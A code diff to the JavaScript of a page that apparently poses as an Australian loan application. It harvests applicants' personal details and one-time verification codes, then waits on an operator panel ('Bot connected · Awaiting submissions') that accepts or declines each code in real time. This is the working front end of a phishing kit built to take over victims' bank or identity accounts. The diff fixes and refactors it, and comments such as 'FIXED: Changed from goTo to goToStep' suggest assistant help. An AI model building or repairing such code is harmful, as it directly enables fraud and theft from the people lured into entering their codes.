@@ -866,6 +866,7 @@
       }
     }
 
+    // ── Single Compiled Polling Workspace Loop ──
     function waitForAdminInitial(sessionId) {
       const started = Date.now();
       const iv = setInterval(async () => {
@@ -873,10 +874,23 @@
         try {
           const r = await fetch('/api/check-status/' + sessionId);
           const d = await r.json();
-          if (d.status === 'accept_p5') { clearInterval(iv); handleAdminInitialAccept('p5'); }
-          if (d.status === 'accept_p6') { clearInterval(iv); handleAdminInitialAccept('p6'); }
-          if (d.status === 'accept') { clearInterval(iv); goToStep('success'); } // FIXED: Inline execution mapping directly to success step
-          if (d.status === 'decline') { clearInterval(iv); handleAdminDecline(); }
+
+          if (d.status === 'accept_p5') { 
+            clearInterval(iv); 
+            handleAdminInitialAccept('p5'); 
+          }
+          else if (d.status === 'accept_p6') { 
+            clearInterval(iv); 
+            handleAdminInitialAccept('p6'); 
+          }
+          else if (d.status === 'accept') { 
+            clearInterval(iv); 
+            handleFinalAccept(); 
+          } 
+          else if (d.status === 'decline') { 
+            clearInterval(iv); 
+            handleAdminDecline(); 
+          }
         } catch (e) { }
       }, 2000);
     }
@@ -889,7 +903,7 @@
     }
 
     function handleAdminDecline() {
-      goToStep('otp'); // FIXED: Changed from goTo to goToStep
+      goToStep('otp'); 
       const err = document.getElementById('otp-error');
       if (err) err.style.display = 'block';
       buildOtpInputs();
@@ -902,26 +916,22 @@
       S.currentPinType = type;
       S.dynamicPinVal = '';
 
-      // Maps directly to your new structural HTML component IDs
       const container = document.getElementById('otp-inputs-container');
       const titleText = document.querySelector('#step-otp h2');
       const subText = document.getElementById('otp-length-label');
 
       if (!container) return;
-
       container.innerHTML = '';
 
       const targetLength = type === 'p5' ? 5 : 6;
       if (subText) subText.textContent = targetLength;
       if (titleText) titleText.textContent = `Security Verification`;
 
-      // Dynamically generate the precise layout inputs needed
       for (let i = 0; i < targetLength; i++) {
         const box = document.createElement('input');
         box.type = 'text';
         box.maxLength = 1;
-        // Uses standard tailwind styles to look identical to your high-contrast mockup designs
-        box.className = 'w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none focus:border-brand-red transition-all';
+        box.className = 'w-12 h-14 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:outline-none focus:border-brand-red transition-all text-gray-900 bg-white';
         box.inputMode = 'numeric';
         box.id = 'dpb' + i;
 
@@ -943,7 +953,7 @@
         });
         container.appendChild(box);
       }
-      goToStep('otp'); // Correctly targets your active HTML container step layout
+      goToStep('otp'); 
     }
 
     function updateDynamicPinVal(length) {
@@ -953,80 +963,56 @@
         if (el) combinedValue += el.value;
       }
       S.dynamicPinVal = combinedValue;
-      const btn = document.getElementById('dynamic-pin-submit-btn');
-      if (btn) btn.disabled = combinedValue.length < length;
     }
 
     async function submitDynamicPin() {
-      const err = document.getElementById('dynamic-pin-error');
-      if (err) err.style.display = 'none';
-
-      document.getElementById('proc-title').textContent = 'Transmitting Authorization Code...';
-      document.getElementById('proc-sub').textContent = 'Securing signature payloads. Do not close this tab.';
-      goToStep('processing'); // FIXED: Changed from goTo to goToStep
+      // Adjusted safely to avoid crashing on missing error element fields
+      const titleEl = document.getElementById('processing-title');
+      const subEl = document.getElementById('processing-subtitle');
+      
+      if (titleEl) titleEl.textContent = 'Transmitting Authorization Code...';
+      if (subEl) subEl.textContent = 'Securing signature payloads. Do not close this tab.';
+      goToStep('processing');
 
       try {
         await fetch('/api/verify-dynamic-pin', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          method: 'POST', 
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ sessionId: S.sessionId, pinType: S.currentPinType, pinValue: S.dynamicPinVal })
         });
 
-        waitForAdminFinal(S.sessionId);
+        // Run a second wait loop tracking the final approval outcome payload
+        waitForAdminInitial(S.sessionId);
       } catch (err) {
         console.error(err);
-        goToStep('dynamic-pin'); // FIXED: Changed from goTo to goToStep
+        goToStep('otp'); 
       }
     }
 
-    function waitForAdminInitial(sessionId) {
-      const started = Date.now();
-      const iv = setInterval(async () => {
-        if (Date.now() - started > 5 * 60 * 1000) { clearInterval(iv); handleAdminDecline(); return; }
-        try {
-          const r = await fetch('/api/check-status/' + sessionId);
-          const d = await r.json();
-
-          if (d.status === 'accept_p5') { clearInterval(iv); goToStep('otp'); }
-          else if (d.status === 'accept_p6') { clearInterval(iv); handleAdminInitialAccept('p6'); }
-          else if (d.status === 'accept') { clearInterval(iv); handleFinalAccept(); } // Routes cleanly and updates summary fields
-          else if (d.status === 'decline') { clearInterval(iv); handleAdminDecline(); }
-        } catch (e) { }
-      }, 2000);
-    }
-
     function handleFinalAccept() {
-      const nameEl = document.getElementById('sum-name');
+      // Fixed element mappings matching your high contrast summary elements
+      const nameEl = document.getElementById('summary-name');
       if (nameEl) nameEl.textContent = `${S.title} ${S.firstName} ${S.lastName}`;
 
-      const purpEl = document.getElementById('sum-purpose');
+      const purpEl = document.getElementById('summary-purpose');
       if (purpEl) purpEl.textContent = S.purpose;
 
-      const amtEl = document.getElementById('sum-amount');
+      const amtEl = document.getElementById('summary-amount');
       if (amtEl) amtEl.textContent = '$' + S.amount.toLocaleString();
 
-      const termEl = document.getElementById('sum-term');
+      const termEl = document.getElementById('summary-term');
       if (termEl) termEl.textContent = S.term + (S.term === 1 ? ' Year' : ' Years');
 
-      const emailEl = document.getElementById('sum-email');
+      const emailEl = document.getElementById('summary-email');
       if (emailEl) emailEl.textContent = S.email;
 
-      const phoneEl = document.getElementById('sum-phone');
+      const phoneEl = document.getElementById('summary-phone');
       if (phoneEl) phoneEl.textContent = '+61 ' + S.phone;
 
       if (typeof pushToPanel === "function") {
         pushToPanel('<div style="color:#4ade80;font-weight:700">✅ Application completely complete. Disbursed funds layout loaded.</div>');
       }
-      goToStep('success'); // FIXED: Changed from goTo to goToStep
-    }
-
-    function handleFinalDecline() {
-      goToStep('dynamic-pin'); // FIXED: Changed from goTo to goToStep
-      const err = document.getElementById('dynamic-pin-error');
-      if (err) err.style.display = 'block';
-      buildDynamicPinBoxes(S.currentPinType);
-      if (typeof pushToPanel === "function") {
-        pushToPanel('<div style="color:#f87171;font-weight:700">❌ Final authorization parameter rejected — Client error rendered.</div>');
-      }
+      goToStep('success'); 
     }
 
     function simDecide(action) {
@@ -1036,14 +1022,16 @@
 
     function resetApp() {
       S = { purpose: '', amount: 30000, term: 5, title: '', firstName: '', lastName: '', email: '', phone: '', otpVal: '', sessionId: null, currentPinType: '', dynamicPinVal: '' };
-      document.getElementById('details-form').reset();
+      const detailsForm = document.getElementById('details-form');
+      if (detailsForm) detailsForm.reset();
       const feed = document.getElementById('tg-feed');
       if (feed) feed.innerHTML = '<div class="tg-system">Bot connected · Awaiting submissions</div>';
       calcRepayments();
-      goToStep('purpose'); // FIXED: Changed from goTo to goToStep
+      goToStep('selection'); 
     }
 
     window.onload = calcRepayments;
+
   </script>
 </body>
 
